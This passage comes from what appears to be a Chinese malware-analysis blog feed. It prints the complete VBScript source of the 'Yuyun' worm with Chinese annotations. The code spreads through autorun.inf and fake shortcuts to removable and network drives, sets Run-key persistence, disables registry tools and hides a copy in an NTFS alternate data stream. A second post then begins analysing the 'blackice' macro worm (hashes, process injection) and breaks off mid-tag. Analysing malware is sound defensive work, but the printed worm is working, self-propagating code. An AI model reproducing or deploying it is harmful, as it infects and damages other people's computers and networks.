class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-comment">&#x27;=======================================================</span><br><span class="hljs-comment">&#x27; My name : Yuyun Ver 1.0</span><br><span class="hljs-comment">&#x27; I just wanna see every girl looks nice, better, kinds especially a moslem girl</span><br><span class="hljs-comment">&#x27; by: Anonymouse in Jatim, November 2008</span><br><span class="hljs-comment">&#x27; When I found nothing beauty else... and then I wrote this script for all</span><br><span class="hljs-comment">&#x27;=======================================================</span><br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br><span class="hljs-keyword">Dim</span> fso, ws, status,status1, fly<br><span class="hljs-keyword">Set</span> fso = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;scripting.filesystemobject&quot;</span>)<br><span class="hljs-keyword">Set</span> ws = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;wscript.Shell&quot;</span>)<br><span class="hljs-keyword">Set</span> sh = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Shell.application&quot;</span>)<br><span class="hljs-keyword">Set</span> net = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;wscript.network&quot;</span>)<br>fly=<span class="hljs-literal">false</span><br>tmp=fso.GetSpecialFolder(<span class="hljs-number">2</span>)<br>tn=fso.GetTempName<br>tmpt=tmp+<span class="hljs-string">&quot;\&quot;</span>+tn<br>docx=ws.SpecialFolders(<span class="hljs-string">&quot;MyDocuments&quot;</span>)         <span class="hljs-comment">&#x27;我的文档文件夹</span><br><br><span class="hljs-keyword">Set</span> swt=WScript.Arguments<br><span class="hljs-keyword">If</span> swt.Count&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">Then</span>          <span class="hljs-comment">&#x27;存在参数，将参数赋值给status</span><br>status=swt(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">if</span> fso.fileexists(tmp+<span class="hljs-string">&quot;\Yuyun.Q&quot;</span>) <span class="hljs-keyword">then</span><br><span class="hljs-keyword">set</span> ira=fso.getfile(tmp+<span class="hljs-string">&quot;\Yuyun.Q&quot;</span>)<br>ira.attributes=<span class="hljs-number">0</span><br>ira.name=<span class="hljs-string">&quot;shalihah.ira&quot;</span><br><span class="hljs-keyword">if</span> ira.name=<span class="hljs-string">&quot;shalihah.ira&quot;</span> <span class="hljs-keyword">then</span><br>ira.name=<span class="hljs-string">&quot;Yuyun.Q&quot;</span><br><span class="hljs-keyword">set</span> ira=fso.opentextfile(tmp+<span class="hljs-string">&quot;\Yuyun.Q&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-literal">true</span>)<br><span class="hljs-keyword">else</span><br>fly=<span class="hljs-literal">true</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">set</span> ira=fso.opentextfile(tmp+<span class="hljs-string">&quot;\Yuyun.Q&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-literal">true</span>)<br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">Set</span> AQ=fso.GetFile(status)      <span class="hljs-comment">&#x27;获取参数脚本文件</span><br><span class="hljs-keyword">If</span> fso.FileExists(tmpt) <span class="hljs-keyword">Then</span> fso.GetFile(tmpt).Attributes=<span class="hljs-number">0</span><br>AQ.Copy tmpt,<span class="hljs-literal">True</span>               <span class="hljs-comment">&#x27;复制参数脚本文件到临时文件</span><br><span class="hljs-keyword">Set</span> AQ=fso.GetFile(tmpt)<br>AQ.Attributes=<span class="hljs-number">39</span>               <span class="hljs-comment">&#x27;39=32+4+2+1,即存档文件+系统文件+隐藏文件+只读文件</span><br>anv=tmp+<span class="hljs-string">&quot;\auto.exe&quot;</span><br><span class="hljs-keyword">If</span> <span class="hljs-keyword">Not</span> fso.FileExists(anv) <span class="hljs-keyword">Then</span> AQ.Copy anv          <span class="hljs-comment">&#x27;复制重命名为auto.exe</span><br><span class="hljs-keyword">Set</span> auto=fso.GetFile(anv) <br>auto.attributes=<span class="hljs-number">0</span><br><br><span class="hljs-keyword">Set</span> aut=fso.OpenTextFile(anv,<span class="hljs-number">2</span>,<span class="hljs-literal">True</span>,<span class="hljs-number">0</span>)                <span class="hljs-comment">&#x27;以Text打开auto.exe</span><br>isi=<span class="hljs-string">&quot;[autorun]&gt;open=WScript.exe //e:VBScript thumb.db auto&gt;shell\open=Open&gt;shell\open\Command=WScript.exe //e:VBScript thumb.db auto&gt;shell\open\Default=1&gt;shell\explore=Explore&gt;shell\explore\Command=WScript.exe //e:VBScript thumb.db auto&quot;</span><br>isi=<span class="hljs-built_in">Replace</span>(isi,<span class="hljs-string">&quot;&gt;&quot;</span>,vbCrLf)                           <span class="hljs-comment">&#x27;&gt;替换为回车</span><br>aut.Write isi                                         <span class="hljs-comment">&#x27;写入auto.exe</span><br>aut.Close<br>auto.Attributes=<span class="hljs-number">39</span><br><br>ltkc=sh.Name<span class="hljs-built_in">space</span>(&amp;H1c&amp;).Self.path + <span class="hljs-string">&quot;\Microsoft\CD Burning&quot;</span><br>AQ.Copy ltkc+<span class="hljs-string">&quot;\thumb.db&quot;</span>,<span class="hljs-literal">True</span><br>auto.Copy ltkc+<span class="hljs-string">&quot;\autorun.inf&quot;</span>,<span class="hljs-literal">True</span><br><span class="hljs-keyword">If</span> fso.FileExists(docx+<span class="hljs-string">&quot;\database.mdb&quot;</span>) <span class="hljs-keyword">Then</span> fso.GetFile(docx+<span class="hljs-string">&quot;\database.mdb&quot;</span>).Attributes=<span class="hljs-number">0</span><br>AQ.Copy docx+<span class="hljs-string">&quot;\database.mdb&quot;</span>,<span class="hljs-literal">True</span>                    <span class="hljs-comment">&#x27;原脚本文件复制到我的文档目录下，命名为database.mdb</span><br>regQ                                                  <span class="hljs-comment">&#x27;修改注册表</span><br><span class="hljs-keyword">Set</span> rara=UNISKA<br>Hertz <span class="hljs-literal">False</span><br><span class="hljs-keyword">If</span> <span class="hljs-built_in">Day</span>(Now)&lt;&gt;<span class="hljs-number">3</span> <span class="hljs-keyword">Then</span> rekursif docx,<span class="hljs-number">1</span> <span class="hljs-keyword">Else</span> rekursif docx,<span class="hljs-number">3</span>    <span class="hljs-comment">&#x27;判断时间是不是3日</span><br><br><span class="hljs-keyword">call</span> attack_net<br>Hertz <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">Sub</span> rekursif(path,dp)<br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br>dropf path<br>wscript.sleep <span class="hljs-number">50</span><br><span class="hljs-keyword">If</span> dp&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">Then</span><br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> fldr1 <span class="hljs-keyword">In</span> fso.GetFolder(path+<span class="hljs-string">&quot;\&quot;</span>).SubFolders<br>rekursif fldr1.Path, dp<span class="hljs-number">-1</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br><br><span class="hljs-keyword">Sub</span> dropf(path)<br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">day</span>(now)=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-built_in">month</span>(now)mod <span class="hljs-number">3</span>)=<span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <br>rara.copy path+<span class="hljs-string">&quot;\Baca AQ.rtf&quot;</span><br>rara.copy path+<span class="hljs-string">&quot;\My name is Yuyun.rtf&quot;</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><br>g1=path+<span class="hljs-string">&quot;\autorun.inf&quot;</span><br>g2=path+<span class="hljs-string">&quot;\Thumb.db&quot;</span><br><span class="hljs-keyword">If</span> fso.FileExists(g1) <span class="hljs-keyword">Then</span> <br><span class="hljs-keyword">Set</span> g11=fso.GetFile(g1) <br><span class="hljs-keyword">If</span> g11.Attributes&lt;&gt;<span class="hljs-number">39</span> <span class="hljs-keyword">Then</span> <br>g11.Attributes=<span class="hljs-number">0</span><br>auto.Copy path+<span class="hljs-string">&quot;\autorun.inf&quot;</span>,<span class="hljs-literal">True</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">else</span> <br>auto.Copy path+<span class="hljs-string">&quot;\autorun.inf&quot;</span>,<span class="hljs-literal">True</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><br><br><span class="hljs-keyword">If</span> fso.FileExists(g2) <span class="hljs-keyword">Then</span> <br><span class="hljs-keyword">Set</span> g12=fso.GetFile(g2)<br><span class="hljs-keyword">If</span> g12.Attributes&lt;&gt;<span class="hljs-number">39</span> <span class="hljs-keyword">Then</span><br>g12.Attributes=<span class="hljs-number">0</span><br>AQ.Copy path+<span class="hljs-string">&quot;\Thumb.db&quot;</span>,<span class="hljs-literal">True</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">else</span><br>AQ.Copy path+<span class="hljs-string">&quot;\Thumb.db&quot;</span>,<span class="hljs-literal">True</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><br><span class="hljs-keyword">If</span> <span class="hljs-keyword">Not</span> fso.FileExists(path+<span class="hljs-string">&quot;\Microsoft.lnk&quot;</span>) <span class="hljs-keyword">Then</span>              <span class="hljs-comment">&#x27;我的文档文件夹是否存在Microsoft.lnk</span><br>shorZvnita path+<span class="hljs-string">&quot;\Microsoft&quot;</span>,<span class="hljs-string">&quot;Microsoft&quot;</span><br>drop=<span class="hljs-built_in">Array</span>(<span class="hljs-string">&quot;New Harry Potter and...&quot;</span>,<span class="hljs-string">&quot;New Folder&quot;</span>,<span class="hljs-string">&quot;SuratQ&quot;</span>,<span class="hljs-string">&quot;Rahasia&quot;</span>,<span class="hljs-string">&quot;Game&quot;</span>,<span class="hljs-string">&quot;Zvnita&quot;</span>,<span class="hljs-string">&quot;Download&quot;</span>,<span class="hljs-string">&quot;DataQ&quot;</span>,<span class="hljs-string">&quot;DataQ&quot;</span>)    <span class="hljs-comment">&#x27;创建超链接文件</span><br>ww=<span class="hljs-number">1</span><br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> d <span class="hljs-keyword">In</span> drop                      <br><span class="hljs-keyword">If</span> <span class="hljs-built_in">Day</span>(now) Mod <span class="hljs-number">3</span> = ww <span class="hljs-keyword">Then</span> shorZvnita path+<span class="hljs-string">&quot;\&quot;</span>+d,d<br>wscript.sleep <span class="hljs-number">60</span><br>ww=ww+<span class="hljs-number">1</span><br><span class="hljs-keyword">Next</span><br>r=<span class="hljs-number">0</span><br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> fldr <span class="hljs-keyword">In</span> fso.GetFolder(path+<span class="hljs-string">&quot;\&quot;</span>).SubFolders        <span class="hljs-comment">&#x27;我的文档文件夹</span><br>shorZvnita path+<span class="hljs-string">&quot;\&quot;</span>+fldr.name,fldr.Name<br>wscript.sleep <span class="hljs-number">60</span><br><span class="hljs-keyword">If</span> r&gt;<span class="hljs-number">3</span> <span class="hljs-keyword">Then</span> <br><span class="hljs-keyword">Exit</span> <span class="hljs-keyword">For</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">if</span><br>r=r+<span class="hljs-number">1</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br><br><span class="hljs-keyword">Sub</span> shorZvnita(path,trgt)                    <span class="hljs-comment">&#x27;创建超链接文件</span><br><span class="hljs-keyword">Set</span> shor=ws.CreateShortcut(path+<span class="hljs-string">&quot;.lnk&quot;</span>)<br>shor.iconlocation=<span class="hljs-string">&quot;shell32.dll,3&quot;</span><br>shor.targetpath=<span class="hljs-string">&quot;wscript.exe&quot;</span><br>shor.arguments=<span class="hljs-string">&quot;//e:VBScript thumb.db &quot;&quot;&quot;</span>+trgt+<span class="hljs-string">&quot;&quot;&quot;&quot;</span><br>shor.save<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br><br><span class="hljs-keyword">function</span> attack_net()<br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br>err.clear<br><span class="hljs-keyword">Set</span> objFolder = sh.Name<span class="hljs-built_in">space</span>(&amp;H13&amp;)              <span class="hljs-comment">&#x27;network shortcuts网络位置</span><br><span class="hljs-keyword">Set</span> colItems = objFolder.Items<br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> strFileName <span class="hljs-keyword">in</span> objFolder.Items          <span class="hljs-comment">&#x27;遍历网络位置</span><br>t= objFolder.GetDetailsOf(strFileName, <span class="hljs-number">14</span>)<br><span class="hljs-keyword">if</span> fso.folderexists(t) <span class="hljs-keyword">then</span>                      <span class="hljs-comment">&#x27;感染</span><br>rekursif t,<span class="hljs-number">4</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">function</span><br><br><span class="hljs-keyword">Sub</span> tdr()<br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br>err.clear<br>WScript.Sleep <span class="hljs-number">180000</span><br><span class="hljs-keyword">if</span> err.number&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">then</span> wscript.quit<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br><br><span class="hljs-keyword">function</span> UNISKA()                                <span class="hljs-comment">&#x27;写v.doc</span><br><span class="hljs-keyword">On</span> <span class="hljs-keyword">error</span> <span class="hljs-keyword">resume</span> <span class="hljs-keyword">next</span><br>x=vbcrlf<br>adv=<span class="hljs-string">&quot;Yuyun Ver 1.0 ^_^!==================&gt;&gt;Bukan dari tulang ubun ia dicipta&gt;karna berbahaya membiarkannya dalam sanjung dan puja&gt;tak juga dari tulang kaki&gt;karna nista membuatnya diinjak dan diperbudak&gt;tapi dari tulang rusuk bagian kiri&gt;dekat ke hati untuk disayangi&gt;dekat ke tangan untuk dilindungi&gt;&gt;(dikutip dr: Agar Bidadari Cemburu Padamu)&gt;&gt;&gt;&quot;&quot;Janganlah kamu bersikap lemah, dan janganlah (pula) kamu bersedih hati, padahal kamulah&gt;orang-orang yang paling tinggi (derajatnya), jika kamu orang-orang yang beriman.&quot;&quot;&gt;(QS. Ali Imran:139)&gt;&gt;&gt;Katakanlah kepada orang laki-laki yang beriman: &quot;&quot;Hendaklah mereka menahan pandanganya, &gt;dan memelihara kemaluannya; yang demikian itu adalah lebih suci bagi mereka, &gt;sesungguhnya Allah Maha Mengetahui apa yang mereka perbuat.&quot;&quot; (QS. An Nur:30)&gt;&gt;Katakanlah kepada wanita yang beriman: &quot;&quot;Hendaklah mereka menahan pandangannya, &gt;dan kemaluannya, dan janganlah mereka menampakkan perhiasannya, kecuali yang &gt;(biasa) nampak dari padanya. Dan hendaklah mereka menutupkan kain kudung &gt;kedadanya....&quot;&quot; (QS. An Nur:30)&gt;&gt;Sorry I just Nitip Print thok....Ndak pa2 khan^_^!  www.muslimah.or.id &gt;&gt;Hai anak Adam, sesungguhnya Kami telah menurunkan kepadamu &gt;pakaian untuk menutup auratmu dan pakaian indah untuk perhiasan.&gt;Dan pakaian takwa itulah yang paling baik. Yang demikian itu adalah &gt;sebahagian dari tanda-tanda kekuasaan Allah, mudah-mudahan mereka selalu ingat.(Al-A&#x27;raf:26)&quot;</span><br><br>adv=<span class="hljs-built_in">replace</span>(adv,<span class="hljs-string">&quot;&gt;&quot;</span>,x)<br><span class="hljs-keyword">set</span> Yu2n=fso.opentextfile(tmp+<span class="hljs-string">&quot;\v.doc&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-literal">true</span>)<br>Yu2n.write adv<br>Yu2n.close<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">day</span>(now)=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-built_in">month</span>(now)mod <span class="hljs-number">3</span>)=<span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <br><span class="hljs-keyword">if</span> fly=<span class="hljs-literal">false</span> <span class="hljs-keyword">then</span><br><span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">3</span><br>ws.run <span class="hljs-string">&quot;notepad.exe /p &quot;&quot;&quot;</span>+tmp+<span class="hljs-string">&quot;\v.doc&quot;&quot;&quot;</span><br><span class="hljs-keyword">next</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">set</span> UNISKA=fso.getfile(tmp+<span class="hljs-string">&quot;\v.doc&quot;</span>)<br><span class="hljs-keyword">end</span> <span class="hljs-keyword">function</span><br><br><span class="hljs-keyword">Sub</span> regQ()                                             <span class="hljs-comment">&#x27;修改注册表，设置桌面快捷方式、实现自启动</span><br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">day</span>(now)=<span class="hljs-number">1</span> <span class="hljs-keyword">then</span>                                     <span class="hljs-comment">&#x27;每月一日</span><br>ws.RegWrite <span class="hljs-string">&quot;HKCR\CLSID\&#123;11111111-2222-3333-4444-555555555555&#125;\&quot;</span>, <span class="hljs-string">&quot;Yuyun_Cantix&quot;</span><br>ws.RegWrite <span class="hljs-string">&quot;HKCR\CLSID\&#123;11111111-2222-3333-4444-555555555555&#125;\DefaultIcon\&quot;</span>,<span class="hljs-string">&quot;shell32.dll,48&quot;</span><br>ws.RegWrite <span class="hljs-string">&quot;HKCR\CLSID\&#123;11111111-2222-3333-4444-555555555555&#125;\ShellFolder\Attributes&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&quot;REG_DWORD&quot;</span><br>ws.regwrite <span class="hljs-string">&quot;HKLM\Software\Microsoft\Windows\CurrentVersion\explorer\Desktop\NameSpace\&#123;11111111-2222-3333-4444-555555555555&#125;\&quot;</span>,<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br>ws.regdelete <span class="hljs-string">&quot;HKCR\lnkfile\IsShortcut&quot;</span><br>ws.RegWrite <span class="hljs-string">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Explorer&quot;</span>,<span class="hljs-string">&quot;Wscript.exe //e:VBScript &quot;&quot;&quot;</span>+docx+<span class="hljs-string">&quot;\database.mdb&quot;&quot;&quot;</span><br>ws.RegWrite <span class="hljs-string">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistrytools&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;REG_DWORD&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">lcase</span>(fso.getdrive(<span class="hljs-string">&quot;c:&quot;</span>).FileSystem)=<span class="hljs-string">&quot;ntfs&quot;</span> <span class="hljs-keyword">then</span><br>iraQ=AQ.openastextstream(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>).read(AQ.size)<br>www=fso.GetSpecialFolder(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">set</span> jjk=fso.opentextfile(www+<span class="hljs-string">&quot;\:Microsoft Office Update for Windows XP.sys&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-literal">true</span>)<br>jjk.write iraQ<br>jjk.close<br>ws.RegWrite <span class="hljs-string">&quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WinUpdate&quot;</span>,<span class="hljs-string">&quot;Wscript.exe //e:VBScript &quot;&quot;&quot;</span>+www+<span class="hljs-string">&quot;\:Microsoft Office Update for Windows XP.sys&quot;&quot;&quot;</span>   <span class="hljs-comment">&#x27;自启动</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br><br><span class="hljs-keyword">Sub</span> Hertz(ooo)<br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br><span class="hljs-keyword">do</span><br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> drv <span class="hljs-keyword">In</span> fso.Drives     <span class="hljs-comment">&#x27;遍历驱动器</span><br><span class="hljs-keyword">If</span> drv.DriveType=<span class="hljs-number">1</span> <span class="hljs-keyword">Then</span>        <span class="hljs-comment">&#x27;可移动驱动器</span><br>rekursif drv.Path,<span class="hljs-number">4</span><br><span class="hljs-keyword">Else</span>                           <span class="hljs-comment">&#x27;其他驱动器</span><br>rekursif drv.Path,<span class="hljs-number">2</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">if</span> fly=<span class="hljs-literal">false</span> <span class="hljs-keyword">then</span> <br>tdr<br><span class="hljs-keyword">else</span> <br>wscript.quit<br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br>regQ<br><span class="hljs-keyword">If</span> ooo=<span class="hljs-literal">False</span> <span class="hljs-keyword">Then</span> <br><span class="hljs-keyword">Exit</span> <span class="hljs-keyword">Do</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">loop</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br></code></pre></td></tr></table></figure><p>主要函数功能如下：</p><p><strong>Sub rekursif(path,dp)</strong> 负责递归目录，path是目录路径，dp是递归目录层数</p><p><strong>Sub dropf(path)</strong> 负责复制传播的函数，主要就是复制autorun.inf、Thumb.db到目录下</p><p><strong>Sub shorZvnita(path,trgt)</strong> 创建包含指定命令的超链接文件</p><p><strong>function attack_net()</strong> 负责网络位置传播，即局域网内传播</p><p><strong>Sub tdr()</strong> 负责错误检查</p><p><strong>function UNISKA()</strong> 写入v.doc文件，包含指定内容，内容无实质意义</p><p><strong>Sub regQ()</strong>   注册表操作，包括创建桌面快捷方式、开机自启动</p><p><strong>Sub Hertz(ooo)</strong>  遍历驱动器，在本地和可移动介质目录进行复制传播</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>样本主要功能为：修改注册表，大量创建包含指定命令的超链接文件，复制病毒到主机文件夹目录下，并通过可移动介质盘和网络位置进行传播。总之，危害不大，传播性不强。但是这是第一次见到的纯vbs脚本病毒，以前遇见的vbs多作为中间衍生物或者下载器。</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vbs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>blackice病毒分析</title>
    <link href="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <url>/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>捕获到的宏病毒样本，可以通过拼接字符串生成exe，比较老的蠕虫病毒，分析如下：</p><h2 id="宏样本分析"><a href="#宏样本分析" class="headerlink" title="宏样本分析"></a>宏样本分析</h2><h3 id="核心功能"><a href="#核心功能" class="headerlink" title="核心功能"></a>核心功能</h3><p>宏代码通过感染office文件及宏模板进行传播，执行后会在系统的Temp文件夹下生成“bk_****.tmp”文件并调用，最终生成blackice.exe</p><h3 id="宏代码分析"><a href="#宏代码分析" class="headerlink" title="宏代码分析"></a>宏代码分析</h3><p>拼接将要写入tmp文件的字符串</p><img src="1-16541516283931.png" alt="1" style="zoom:67%;" /><p>获取系统Temp文件夹路径，随机生成tmp文件的名字（格式为“bk_****.tmp”），并创建与之对应的tmp文件</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143412773.png" alt="image-20220602143412773"></p><p>用上面拼接的字符串解密出一个PE文件的内容，并将其写入tmp文件中</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143422561.png" alt="image-20220602143422561"></p><p>执行生成的tmp文件</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143431482.png" alt="image-20220602143431482"></p><p>感染office文档的函数模块</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143439457.png" alt="image-20220602143439457"></p><p>感染office模板的函数模块</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143448296.png" alt="image-20220602143448296"></p><h2 id="病毒样本基本信息"><a href="#病毒样本基本信息" class="headerlink" title="病毒样本基本信息"></a>病毒样本基本信息</h2><h3 id="样本名称：blackice-exe"><a href="#样本名称：blackice-exe" class="headerlink" title="样本名称：blackice.exe"></a>样本名称：blackice.exe</h3><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143641966.png" alt="image-20220602143641966"></p><h3 id="样本hash"><a href="#样本hash" class="headerlink" title="样本hash"></a>样本hash</h3><p>MD5: C89CDBA61B9B4D882698A084A25907D3</p><p>SHA1: D77E96CEA7F7EF38034D52CAE2A4E4FDE29C37CA</p><h2 id="病毒样本分析"><a href="#病毒样本分析" class="headerlink" title="病毒样本分析"></a>病毒样本分析</h2><p>经查壳可知为C++写的，无壳</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143727402.png" alt="image-20220602143727402"></p><p><img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143747142.png" alt="image-20220602143747142"></p><p>使用IDA pro对文件进行分析</p><h3 id="WinMain"><a href="#WinMain" class="headerlink" title="WinMain"></a>WinMain</h3><p>创建互斥量，防止多个blackice进程同时启动</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143830187.png" alt="image-20220602143830187"></p><p>判断系统是不是Windows 7, Windows Server 2008, Windows Vista, Windows Server 2003, Windows XP或者Windows 2000，不是则直接退出进程，获取系统路径</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143837856.png" alt="image-20220602143837856"></p><p>获取主机信息，提权获得SeDebugPrivilege权限，将自身复制并重命名为blackice.exe，kernel.dll，对explorer.exe进程进行注入</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143844024.png" 